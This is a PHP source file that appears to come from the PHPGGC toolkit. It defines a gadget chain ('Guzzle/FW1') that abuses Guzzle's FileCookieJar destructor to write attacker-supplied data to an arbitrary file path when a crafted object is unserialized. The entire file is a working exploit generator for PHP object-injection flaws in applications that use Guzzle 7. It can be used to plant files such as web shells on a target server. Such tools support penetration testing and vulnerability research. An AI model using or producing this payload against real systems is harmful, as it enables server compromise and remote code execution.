<?php

namespace GadgetChain\Guzzle;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '7.0.0 <= *';
    public static $vector = '__destruct';
    public static $author = 'TrekLaps';
    public static $information = 'File write via FileCookieJar. Content written as JSON array.';

    public function generate(array $parameters)
    {
        $filename = $parameters['remote_path'];
        $data = $parameters['data'];

        // Create FileCookieJar pointing to target file
        $jar = new \GuzzleHttp\Cookie\FileCookieJar($filename);

        // Create cookie with payload as value
        $cookie = new \GuzzleHttp\Cookie\SetCookie([
            'Name' => 'x',
            'Value' => $data,
            'Domain' => 'x',
            'Path' => '/',
            'Max-Age' => null,
            'Expires' => time() + 86400,
            'Secure' => false,
            'Discard' => false,
            'HttpOnly' => false,
        ]);

        // Use reflection to set cookies array
        $ref = new \ReflectionClass(\GuzzleHttp\Cookie\CookieJar::class);
        $prop = $ref->getProperty('cookies');
        $prop->setAccessible(true);
        $prop->setValue($jar, [$cookie]);

        return $jar;
    }
}
